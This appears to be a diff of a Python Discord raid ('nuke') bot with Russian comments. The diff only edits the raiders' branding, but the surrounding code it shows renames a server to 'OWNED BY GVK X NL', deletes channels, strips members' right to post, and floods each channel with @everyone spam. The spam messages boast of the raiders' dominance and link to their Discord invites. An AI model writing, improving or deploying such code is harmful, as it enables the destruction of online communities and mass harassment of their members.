@@ -15,7 +15,7 @@ async def nuke(ctx):
     guild = ctx.guild
     
     # 1. МЕНЯЕМ НАЗВАНИЕ
-    await guild.edit(name="OWNED BY GVK X NL X ELITE ")
+    await guild.edit(name="OWNED BY GVK X NL ")
     
     # 2. УДАЛЯЕМ ВСЕ КАНАЛЫ (быстро)
     print("🗑️ Удаление каналов...")
@@ -30,7 +30,7 @@ async def nuke(ctx):
             await ch.set_permissions(guild.default_role, send_messages=False)
             
             # 30 сообщений (ускоренная отправка)
-            tasks = [ch.send(f"@everyone\n**Вы упали на колени перед царями NLxGVKxELITE**\nhttps://discord.gg/yX8HYtCyu8 https://discord.gg/neverlosetsb") for _ in range(35)]
+            tasks = [ch.send(f"@everyone\n**Вы упали на колени перед царями NLxGVK**\nhttps://discord.gg/yX8HYtCyu8 https://discord.gg/neverlosetsb") for _ in range(35)]
             await asyncio.gather(*tasks)
             
             print(f"✅ Канал {i+1}/60 готов")
